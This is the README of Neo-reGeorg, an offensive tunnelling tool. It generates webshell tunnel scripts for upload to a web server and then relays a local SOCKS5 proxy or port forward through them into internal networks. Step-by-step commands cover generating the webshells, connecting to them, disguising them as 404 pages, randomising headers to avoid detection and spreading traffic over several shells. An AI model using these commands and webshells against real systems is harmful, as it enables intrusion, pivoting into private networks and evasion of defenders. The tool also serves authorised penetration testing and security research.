# Neo-reGeorg

[简体中文](README.md)　｜　[English](README-en.md)

**Neo-reGeorg** is a project designed to actively restructure [reGeorg](https://github.com/sensepost/reGeorg) with the aim of:

* Improve tunnel connection security
* Improve usability and avoid feature detection
* Improve the confidentiality of transmission content
* Solve the existing problems of reGeorg and fix some small bugs

> This tool is limited to safety research and teaching, and the user assumes all legal and related responsibilities caused by the use of this tool! The author does not bear any legal and related responsibilities!

## Version

3.0.0 - [Change Log](CHANGELOG-en.md)


## Features

* Transfer content through out-of-order base64 encryption
* GET request response can be customized (such as masquerading 404 pages)
* HTTP Headers instructions are randomly generated to avoid feature detection
* HTTP Headers can be customized
* Custom HTTP response code
* Multiple URLs random requests
* Server-node DNS resolution
* Compatible with python2 / python3
* High compatibility of the server environment
* (only php) Refer to [pivotnacci](https://github.com/blackarrowsec/pivotnacci) to implement a single `SESSION` to create multiple TCP connections to deal with some load balancing scenarios
* aspx/ashx/jsp/jspx no longer relies on Session, and can run normally in harsh environments such as cookie-free
* Support HTTP forwarding, coping with load balancing environment


## Dependencies

* [**requests**] - https://github.com/kennethreitz/requests




## Basic Usage

* **Step 1.**
Set the password to generate tunnel server.(aspx|ashx|jsp|jspx|php) and upload it to the web server.
```ruby
$ python neoreg.py generate -k password

    [+] Create neoreg server files:
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel_compatibility.jspx
       => neoreg_servers/tunnel.php
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel_compatibility.jsp

```

* **Step 2.**
Use `neoreg.py` to connect to the web server and create a socks5 proxy locally.
```ruby
$ python3 neoreg.py -k password -u http://xx/tunnel.php
+------------------------------------------------------------------------+
  Log Level set to [DEBUG]
  Starting socks server [127.0.0.1:1080]
  Tunnel at:
    http://xx/tunnel.php
+------------------------------------------------------------------------+
```

   Note that if your tool, such as `nmap` does not support socks5 proxy, please use [proxychains](https://github.com/rofl0r/proxychains-ng) 




## Advanced Usage

1. Support the generated server, by default directly requesting and responding to the specified page content (such as a disguised 404 page)
```ruby
$ python neoreg.py generate -k <you_password> --file 404.html
$ python neoreg.py -k <you_password> -u <server_url> --skip
```

2. For example, the server WEB needs to set the proxy to access
```ruby
$ python neoreg.py -k <you_password> -u <server_url> --proxy socks5://10.1.1.1:8080
```

3. To set `Authorization`, there are also custom `Header` or `Cookie` content.
```ruby
$ python neoreg.py -k <you_password> -u <server_url> -H 'Authorization: cm9vdDppcyB0d2VsdmU=' --cookie "key=value;key2=value2"
```

4. Need to disperse requests, upload to multiple paths, such as memory-webshell
```ruby
$ python neoreg.py -k <you_password> -u <url_1> -u <url_2> -u <url_3> ...
```

5. Turn on http forwarding to cope with load balancing
```ruby
$ python neoreg.py -k <you_password> -u <url> -r <redirect_url>
```

6. Use the port forwarding function, do not start the socks5 service ( 127.0.0.1:1080 -> ip:port )
```ruby
$ python neoreg.py -k <you_password> -u <url> -t <ip:port>
```

* For more information on performance and stability parameters, refer to -h help information
```ruby
# Generate server-side scripts
$ python neoreg.py generate -h
    usage: neoreg.py [-h] -k KEY [-o DIR] [-f FILE] [-c CODE] [--read-buff Bytes]

    Generate neoreg webshell

    optional arguments:
      -h, --help            show this help message and exit
      -k KEY, --key KEY     Specify connection key.
      -o DIR, --outdir DIR  Output directory.
      -f FILE, --file FILE  Camouflage html page file
      -c CODE, --httpcode CODE
                            Specify HTTP response code. When using -r, it is
                            recommended to <400. (default: 200)
      --read-buff Bytes     Remote read buffer. (default: 513)

# Connection server
$ python neoreg.py -h
    usage: neoreg.py [-h] -u URI [-r URL] [-t IP:PORT] -k KEY [-l IP] [-p PORT]
                     [-s] [-H LINE] [-c LINE] [-x LINE] [--local-dns]
                     [--read-buff Bytes] [--read-interval MS]
                     [--write-interval MS] [--max-threads N] [-v]

    Socks server for Neoreg HTTP(s) tunneller. DEBUG MODE: -k
    (debug_all|debug_base64|debug_headers_key|debug_headers_values)

    optional arguments:
      -h, --help            show this help message and exit
      -u URI, --url URI     The url containing the tunnel script
      -r URL, --redirect-url URL
                            Intranet forwarding the designated server (only
                            jsp(x))
      -t IP:PORT, --target IP:PORT
                            Network forwarding Target, After setting this
                            parameter, port forwarding will be enabled
      -k KEY, --key KEY     Specify connection key
      -l IP, --listen-on IP
                            The default listening address.(default: 127.0.0.1)
      -p PORT, --listen-port PORT
                            The default listening port.(default: 1080)
      -s, --skip            Skip usability testing
      -H LINE, --header LINE
                            Pass custom header LINE to server
      -c LINE, --cookie LINE
                            Custom init cookies
      -x LINE, --proxy LINE
                            Proto://host[:port] Use proxy on given port
      --local-dns           Use local resolution DNS
      --read-buff Bytes     Local read buffer, max data to be sent per
                            POST.(default: 2048 max: 2600)
      --read-interval MS    Read data interval in milliseconds.(default: 300)
      --write-interval MS   Write data interval in milliseconds.(default: 200)
      --max-threads N       Proxy max threads.(default: 1000)
      -v                    Increase verbosity level (use -vv or more for greater
                            effect)
```


## Remind

* When running `neoreg.py` with high concurrency on Mac OSX, a large number of network requests will be lost. You can use `ulimit -n 2560` to modify the "maximum number of open files" of the current shell.



## TODO

* HTTP body steganography

* Transfer Target field steganography



## License

GPL 3.0


## Stargazers over time

[![Stargazers over time](https://starchart.cc/L-codes/Neo-reGeorg.svg)](https://starchart.cc/L-codes/Neo-reGeorg)
